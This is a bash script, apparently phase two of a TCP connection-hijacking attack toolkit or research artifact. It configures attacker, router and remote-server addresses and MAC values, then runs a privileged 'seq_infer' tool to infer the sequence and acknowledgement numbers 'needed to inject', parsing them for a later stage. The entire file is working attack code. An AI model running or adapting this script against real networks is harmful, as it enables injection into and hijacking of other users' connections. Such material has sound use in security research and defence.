# !/bin/bash
ATTACKER_PRIVATE_IP=ddbe:48ec:56c6:0:820:a625:7e19:7604; 
GUESSED_CLIENT_PORT=53040;
REMOTE_SERVER_IPv6=ddbe:48ec:56c6:1111:0000:0000:2b9f:276e; 
REMOTE_SERVER_IP=43.159.39.110; 
REMOTE_SERVER_PORT=1000; 
ROUTER_WAN_IP=166.111.238.1; 
PACKET_IFACE="en0"; 
SELF_MAC_ADDRESS="42:f8:3a:22:c0:e4";
ROUTER_MAC_ADDRESS="a4:39:b3:74:b0:65";

printf "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n~~~~~~~~~~~ PHASE 2 ~~~~~~~~~~~\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
echo `date`
echo "beginning phase 2 to infer sequence and ack numbers needed to inject.."

sudo ./seq_infer ${ATTACKER_PRIVATE_IP} ${GUESSED_CLIENT_PORT} ${REMOTE_SERVER_IPv6} ${REMOTE_SERVER_IP} ${REMOTE_SERVER_PORT} ${ROUTER_WAN_IP} ${PACKET_IFACE} ${SELF_MAC_ADDRESS} ${ROUTER_MAC_ADDRESS}

SEQ_ACK_RESULT=$(cat ../complete_attack/SEQ_ACK_RESULT)
SEQ=$(echo "$SEQ_ACK_RESULT" |grep -o "seq: .*"| awk -F": " '{print $2}'|head -n 1)
# echo $SEQ
ACK=$(echo "$SEQ_ACK_RESULT" |grep -o "ack: .*"| awk -F": " '{print $2}'|head -n 1)
echo `date`
sleep 3s